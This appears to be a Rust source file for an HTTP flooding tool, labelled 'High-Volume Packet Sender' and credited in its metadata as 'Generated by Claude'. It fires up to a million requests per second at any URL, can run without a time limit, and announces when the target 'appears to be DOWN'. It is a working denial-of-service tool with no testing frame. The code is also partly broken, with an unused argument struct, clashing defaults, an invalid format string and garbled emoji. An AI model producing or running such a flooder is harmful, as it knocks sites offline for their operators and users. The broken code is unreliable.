use std::sync::{Arc, atomic::{AtomicBool, AtomicUsize, Ordering}};
use std::time::{Duration, Instant};
use tokio::sync::mpsc;
use tokio::time::sleep;
use reqwest::Client;
use std::io::{self, Write};
use clap::{Parser, Arg, Command};

#[derive(Parser)]
#[command(author, version, about)]
struct Args {
    #[arg(short, long, help = "Target URL to send packets to")]
    url: String,
    
    #[arg(short, long, default_value = "1000000", help = "Target packets per second")]
    rate: usize,
    
    #[arg(short, long, default_value = "10", help = "Number of worker threads")]
    workers: usize,
    
    #[arg(short, long, default_value = "60", help = "Duration in seconds to run (0 for unlimited)")]
    duration: u64,
    
    #[arg(short, long, help = "Payload size in bytes")]
    size: Option<usize>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Get command line arguments
    let matches = Command::new("High-Volume Packet Sender")
        .version("1.0")
        .author("Generated by Claude")
        .about("Sends high volume of packets to a website with delivery notifications")
        .arg(Arg::new("url")
            .short('u')
            .long("url")
            .value_name("URL")
            .help("Target URL to send packets to")
            .required(true))
        .arg(Arg::new("rate")
            .short('r')
            .long("rate")
            .value_name("RATE")
            .help("Target packets per second")
            .default_value("1000000"))
        .arg(Arg::new("workers")
            .short('w')
            .long("workers")
            .value_name("COUNT")
            .help("Number of worker threads")
            .default_value("100"))
        .arg(Arg::new("duration")
            .short('d')
            .long("duration")
            .value_name("SECONDS")
            .help("Duration in seconds to run (0 for unlimited)")
            .default_value("60"))
        .arg(Arg::new("size")
            .short('s')
            .long("size")
            .value_name("BYTES")
            .help("Payload size in bytes"))
        .get_matches();
    
    let url = matches.get_one::<String>("url").unwrap();
    let target_rate: usize = matches.get_one::<String>("rate").unwrap().parse()?;
    let worker_count: usize = matches.get_one::<String>("workers").unwrap().parse()?;
    let duration_secs: u64 = matches.get_one::<String>("duration").unwrap().parse()?;
    let payload_size: Option<usize> = matches.get_one::<String>("size")
        .map(|s| s.parse::<usize>().unwrap_or(0));
    
    println!("üöÄ Starting high-volume packet sender");
    println!("Target URL: {}", url);
    println!("Target rate: {} packets/second", target_rate);
    println!("Worker threads: {}", worker_count);
    if duration_secs > 0 {
        println!("Duration: {} seconds", duration_secs);
    } else {
        println!("Duration: unlimited (until interrupted)");
    }
    
    // Create shared state
    let running = Arc::new(AtomicBool::new(true));
    let packets_sent = Arc::new(AtomicUsize::new(0));
    let packets_successful = Arc::new(AtomicUsize::new(0));
    let packets_failed = Arc::new(AtomicUsize::new(0));
    let url = Arc::new(url.to_string());
    
    // Generate payload if size is specified
    let payload = match payload_size {
        Some(size) if size > 0 => {
            let payload = vec!['A' as u8; size];
            Some(Arc::new(payload))
        },
        _ => None,
    };
    
    // Create channel for notifications
    let (tx, mut rx) = mpsc::channel::<String>(1000);
    
    // Spawn status monitor thread
    let status_running = running.clone();
    let status_packets_sent = packets_sent.clone();
    let status_packets_successful = packets_successful.clone();
    let status_packets_failed = packets_failed.clone();
    
    let status_handle = tokio::spawn(async move {
        let mut last_packets = 0;
        let mut start_time = Instant::now();
        let update_interval = Duration::from_secs(1);
        
        while status_running.load(Ordering::Relaxed) {
            sleep(update_interval).await;
            
            let current_packets = status_packets_sent.load(Ordering::Relaxed);
            let elapsed = start_time.elapsed().as_secs_f64();
            let rate = (current_packets - last_packets) as f64 / elapsed;
            
            // Reset counters for next interval
            last_packets = current_packets;
            start_time = Instant::now();
            
            // Display status
            print!("\rüíº Packets: {} sent, {} successful, {} failed, {:.2f} packets/sec   ", 
                current_packets,
                status_packets_successful.load(Ordering::Relaxed),
                status_packets_failed.load(Ordering::Relaxed),
                rate);
            io::stdout().flush().unwrap();
        }
        
        // Final stats
        println!("\nüìä Final statistics:");
        println!("Total packets sent: {}", status_packets_sent.load(Ordering::Relaxed));
        println!("Successful: {}", status_packets_successful.load(Ordering::Relaxed));
        println!("Failed: {}", status_packets_failed.load(Ordering::Relaxed));
    });
    
    // Spawn notification reader
    let notification_handle = tokio::spawn(async move {
        while let Some(message) = rx.recv().await {
            println!("\nüì¢ {}", message);
        }
    });
    
    // Calculate packets per worker
    let packets_per_worker = target_rate / worker_count;
    let packets_per_second = target_rate;
    
    // Create HTTP clients for workers
    let mut handles = Vec::new();
    
    for worker_id in 0..worker_count {
        let worker_url = url.clone();
        let worker_running = running.clone();
        let worker_packets_sent = packets_sent.clone();
        let worker_packets_successful = packets_successful.clone();
        let worker_packets_failed = packets_failed.clone();
        let worker_payload = payload.clone();
        let worker_tx = tx.clone();
        
        let handle = tokio::spawn(async move {
            let client = Client::builder()
                .timeout(Duration::from_secs(5))
                .build()
                .unwrap_or_else(|_| Client::new());
            
            let mut counter = 0;
            let mut consecutive_failures = 0;
            let mut last_notification_time = Instant::now();
            let worker_packets_per_second = packets_per_worker;
            let sleep_duration = Duration::from_secs_f64(1.0 / worker_packets_per_second as f64);
            
            while worker_running.load(Ordering::Relaxed) {
                let start_time = Instant::now();
                
                // Prepare payload if available
                let request = if let Some(ref data) = worker_payload {
                    client.post(worker_url.as_str()).body(data.to_vec())
                } else {
                    client.get(worker_url.as_str())
                };
                
                // Send packet and check response
                counter += 1;
                worker_packets_sent.fetch_add(1, Ordering::Relaxed);
                
                let result = request.send().await;
                
                match result {
                    Ok(response) => {
                        worker_packets_successful.fetch_add(1, Ordering::Relaxed);
                        consecutive_failures = 0;
                        
                        // Send notification for every 1,000,000 packets
                        if counter % 1_000_000 == 0 {
                            let msg = format!("Worker {}: Successfully sent {} million packets", worker_id, counter / 1_000_000);
                            let _ = worker_tx.send(msg).await;
                        }
                    },
                    Err(_) => {
                        worker_packets_failed.fetch_add(1, Ordering::Relaxed);
                        consecutive_failures += 1;
                        
                        // If we've had multiple consecutive failures and it's been at least 5 seconds since last notification
                        if consecutive_failures >= 10 && last_notification_time.elapsed().as_secs() >= 5 {
                            let msg = format!("‚ö†Ô∏è Worker {}: Website may be down! {} consecutive failures", worker_id, consecutive_failures);
                            let _ = worker_tx.send(msg).await;
                            last_notification_time = Instant::now();
                        }
                        
                        // If many consecutive failures, send a major alert
                        if consecutive_failures >= 100 && last_notification_time.elapsed().as_secs() >= 10 {
                            let msg = format!("üö® ALERT: Website {} appears to be DOWN! Worker {} reports {} consecutive failures", 
                                worker_url, worker_id, consecutive_failures);
                            let _ = worker_tx.send(msg).await;
                            last_notification_time = Instant::now();
                        }
                    }
                }
                
                // Calculate sleep time to maintain target rate
                let elapsed = start_time.elapsed();
                if elapsed < sleep_duration {
                    sleep(sleep_duration - elapsed).await;
                }
            }
        });
        
        handles.push(handle);
    }
    
    // If duration is set, run for that time then stop
    if duration_secs > 0 {
        sleep(Duration::from_secs(duration_secs)).await;
        running.store(false, Ordering::Relaxed);
        println!("\n‚è±Ô∏è Time limit reached, shutting down...");
    } else {
        // Otherwise, wait for Ctrl+C
        let ctrl_c_running = running.clone();
        tokio::spawn(async move {
            let _ = tokio::signal::ctrl_c().await;
            println!("\nüõë Received shutdown signal, stopping workers...");
            ctrl_c_running.store(false, Ordering::Relaxed);
        });
    }
    
    // Wait for all worker threads to complete
    for handle in handles {
        let _ = handle.await;
    }
    
    // Wait for status monitoring to finish
    let _ = status_handle.await;
    let _ = notification_handle.await;
    
    println!("‚úÖ All workers completed successfully");
    Ok(())
}